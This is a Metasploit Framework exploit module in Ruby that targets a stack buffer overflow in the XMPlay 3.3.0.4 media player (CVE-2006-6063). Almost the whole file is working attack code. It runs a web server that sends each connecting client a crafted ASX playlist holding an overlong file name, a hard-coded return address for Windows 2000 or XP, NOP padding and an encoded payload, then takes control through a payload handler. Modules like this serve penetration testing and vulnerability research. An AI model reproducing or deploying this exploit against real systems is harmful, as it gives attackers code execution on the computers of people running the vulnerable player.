##
# $Id: xmplay_asx.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'XMPlay 3.3.0.4 (ASX Filename) Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in XMPlay 3.3.0.4.
				The vulnerability is caused due to a boundary error within
				the parsing of playlists containing an overly long file name.
				This module uses the ASX file format.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'MC',
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2006-6063'],
					[ 'OSVDB', '30537'],
					[ 'BID', '21206'],
					[ 'URL', 'http://secunia.com/advisories/22999/' ],
				],

			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'EncoderType' => Msf::Encoder::Type::AlphanumUpper,
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Windows 2000 Pro English SP4',		{ 'Ret' => 0x77e14c29 } ],
					[ 'Windows XP Pro SP2 English',			{ 'Ret' => 0x77dc15c0 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Nov 21 2006',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		drv	=  rand_text_alpha_upper(1)
		ext	=  rand_text_alpha_upper(3)

		sploit =  rand_text_alpha_upper(498) + [ target.ret ].pack('V')
		sploit << make_nops(40) + payload.encoded

		# Build the stream format
		content =  "<ASX VERSION=\"3\">\r\n" + "<ENTRY>\r\n"
		content << "<REF HREF=\"file://#{drv}:\\" + sploit
		content << "." + "#{ext}\"\r\n" + "</ENTRY>\r\n" + "</ASX>\r\n"

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
